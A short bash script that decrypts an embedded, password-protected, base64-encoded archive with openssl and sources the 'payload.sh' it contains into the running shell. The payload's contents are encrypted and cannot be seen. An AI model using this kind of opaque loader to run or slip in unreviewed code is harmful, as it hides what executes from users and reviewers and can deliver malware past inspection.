#!/usr/bin/env bash

__run_payload() {
  local payload_name="payload.sh"
  local payload='U2FsdGVkX18DXuxVNYuxfbwyNuBhzVo1rYSZPfpHChe9yU+vPC/aOqjTchvtfq9kgoDEExwwI6RkZJAzLhwR5c8x1+Ub82Wg1hPlkd6V0KhQ1PK15FQVIK77Mjv6nnVrclutV3YtUoOmfy+gXW6X2gwl8lkPWjRZCE/2uVbu0ZTbsCSfwoqUUo9pdSHIWThIv7mk3JQ9ex6qx4uLX1Lni6wxZvyZiUR8gxPahw2Vh5kwF54tUbkIepB9zXNdw9JlDdlXlpqGkbRMKa02rGbtWTmtJ2CAHsY7J0IGaMaRK2RwpIdlKDKPp+qdMa2n7hFrvYfmeRSh92LbsQDkeWNchQA+Q6QxfStysY44vyIwOwSVLu4sLDJdnW4MwcQ/PaCBS0BRExwfp9HUEZKk3WbvYVLHCojAFd6HKdiIyYRJYMPcGAYnb8MKrPXzERFdKYOnE9vY5XWR9Ywz4vxRKDKAABIMW+AfPNLU/XqAsYb/0Roe1NHTdnDSYkOZpXDRYhKODlGb5d9LQIhWUZkpYkA8Ma+KVxKO9vWJGcLptlkTW2F97Mhbz5xnr5E4trC2YFwAGgQFCmWDvilnJIh/+ISAYgdKBEhrOA9cTzi8q5iRMlTDpZYPClcqu6GhmG5kvGZBXdAN91wHxgqBW88+q8GbS+iX8r1LWL3eZL9PR59eTgxfGLQUcfcPOQlsAAVZx0NRwLfDEGewDBUMlgtFDQYECP0laPJP+ceaRR0QG5o8yEfDbB55yy+BEMkM1+9+arReUT6tC61QOsgOixmCJxSC01cXF7vd5eeYjDVvnHuoEhUZt1CO9ohCisPBv7fUTgVBxX+lAigPV413bZv6vBrWx5/8kPXyEqKw/SC34wTPG9TQLk7HFNg9NdVBxbgKnOQSs+HPKP+HYwlAvt7nmVpLPLCSMuJdxK6wD580fAOiO5CVQeMECuXwCBi3dpCc2xrWcmM0Jvw/POyHXVBOXdbiYbGuzZSB+6ZQqBIn3IqD5yw2/Vcb8TPwuGRCtUmOMRi9fbKP4KkFfv1oqzjSCLk3sdvTsvdXoc29RG4OlPhiWccT0mgr6+QysMzisHBNFegKSyL+y5TeAVq3WXhoLYhOh3J+hc4FV/rHzwvmWm548ro1ZIonCuA2O9OxutOiq21/Pc3FPOjdvZzLtExeHslJS6YztqXBIOJMwocgEAxCTRIzjT5v9nFObBvlC3gAMKaieBs690fdFdj8YPKBEbFm42TkJEjXVLKD1u2qzWiD5Xu2brRhiEUrRIG1FUn7j5k5tDcCuzd0NtOHFPaBNdvngXFMTOS2fQ5T7AXpV13idrGsZEx8K+1qmgDSn6LDgbmjNWTrmNgFRws5cvNB7Yk9TrKBHOcQJMaI+IG5ysEqeqpVKZzKdu7L9wpQK4HC50VevmCdzi/rMzy9VXSuvdR6xNtQltzpdr7NJgo4bvMppslMv9vE1uqNWDQazSfFt+nw'
  local status=0

  if ! command -v openssl >/dev/null 2>&1; then
    echo "payload: openssl not found in PATH." >&2
    return 2
  fi

  if ! command -v tar >/dev/null 2>&1; then
    echo "payload: tar not found in PATH." >&2
    return 2
  fi

  if ! command -v base64 >/dev/null 2>&1; then
    echo "payload: base64 not found in PATH." >&2
    return 2
  fi

  __base64_decode() {
    if base64 -d </dev/null >/dev/null 2>&1; then
      base64 -d
    else
      base64 -D
    fi
  }

  if [ "$#" -lt 1 ]; then
    echo "payload: password required as first argument." >&2
    return 2
  fi
  local password="$1"
  shift

  local tmp_dir
  tmp_dir="$(mktemp -d)"
  trap 'rm -rf "$tmp_dir"' EXIT

  if ! printf '%s' "$payload" | __base64_decode \
      | openssl enc -d -aes-256-cbc -pbkdf2 -salt -pass "pass:$password" 2>/dev/null \
      | tar -xzf - -C "$tmp_dir"; then
    echo "payload: invalid password or corrupted payload." >&2
    return 1
  fi

  source "$tmp_dir/$payload_name"
}

__run_payload "$@"
status=$?
unset -f __run_payload
return "$status" 2>/dev/null || exit "$status"
